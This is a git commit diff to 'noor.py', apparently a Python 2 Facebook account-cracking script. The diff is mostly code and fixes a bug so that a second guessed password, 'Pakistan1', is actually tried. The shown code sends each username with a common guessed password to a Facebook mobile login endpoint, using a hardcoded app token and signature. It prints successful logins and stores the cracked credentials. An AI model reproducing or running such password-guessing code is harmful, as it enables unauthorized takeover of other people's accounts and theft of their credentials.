7e11bac628cddc43c341e6a1c3cd25a8db32df78
Jam302 <65140038+Jam302@users.noreply.github.com>
2020-06-02 19:56:04 +0500

    Update noor.py

--- noor.py
+++ noor.py
@@ -419,14 +419,14 @@ def pilih_super():
 									                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass7					
 									                               oks.append(user+pass7)
                                                                                                else:
-                                                                                                       pass7 = 'Pakistan'
+                                                                                                       pass8 = 'Pakistan1'
                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                        q = json.load(data)
                                                                                                        if 'access_token' in q:
                                                                                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                z = json.loads(x.text)
                                                                                                                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass8					
-									                                       oks.append(user+pass7)
+									                                       oks.append(user+pass8)
 																	
 															
 		except:
